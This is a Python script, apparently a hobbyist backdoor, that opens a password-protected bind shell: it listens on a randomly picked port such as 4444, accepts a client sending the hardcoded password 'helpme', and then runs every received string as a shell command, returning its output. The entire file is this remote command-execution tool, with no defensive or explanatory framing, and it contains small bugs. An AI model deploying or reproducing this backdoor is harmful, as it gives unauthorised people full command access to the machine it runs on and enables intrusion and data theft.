import socket
import subprocess
import os
import random


def lookForConnection(server):
    print('Server Started')
    print('Listening For Client Connection')
    server.listen(1)
    client, client_addr = server.accept()
    password = client.recv(1024)
    password = password.decode()
    return password, client, client_addr

def checkPass(password, client, client_addr):
    valid = False
    if password == real_password:
        valid = True
        print(str(client_addr) + " has connected to the server")
        client.send(("Connected!"))
    else:
        valid = False
        client.send(("Incorrect Password...Closing Connection").encode())
        client.close()
    return valid

HOSTNAME = socket.gethostname()
HOST = socket.gethostbyname(HOSTNAME)
POTENTIAL_PORTS = [4444, 4200, 3600, 4000, 4400]
PORT = random.choice(POTENTIAL_PORTS)
real_password = "helpme"
passwords_match = False
server = socket.socket()
server.bind((HOST, PORT))
password, client, client_addr = lookForConnection(server)
passwords_match = checkPass(password, client, client_addr)

while passwords_match == False:
    password, client, client_addr = lookForConnection(server)
    passwords_match = checkPass(password, client, client_addr)

while passwords_match == True:
    print("Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    if command == "exit":
        passwords_match == False
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        client.send(("Disconnecting").encode())
        client.close()
        password, client, client_addr = lookForConnection(server)
        passwords_match = checkPass(password, client, client_addr)
    elif command[:2] == "cd" or command[:5] == "chdir":
        if command[:2] == "cd":
            if command == "cd":
                try:
                    os.chdir(os.path.expanduser("~"))
                    client.send(("Moved Directories").encode())
                    print("Sending response...")
                except:
                    print("cd did not work")
            else:
                try:
                    os.chdir(command[3:])
                    client.send(("Moved Directories").encode())
                    print("Sending response...")
                except OSError:
                    print("cd did not work")
        else:
            if command == "chdir":
                try:
                    os.chdir(os.path.expanduser("~"))
                    client.send(("Moved Directories").encode())
                    print("Sending response...")
                except:
                    print("cd did not work")
            else:
                try:
                    os.chdir(command[6:])
                    client.send(("Moved Directories").encode())
                    print("Sending response...")
                except OSError:
                    print("cd did not work")
    else:
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        print("Sending response...")
        client.send(output + output_error)
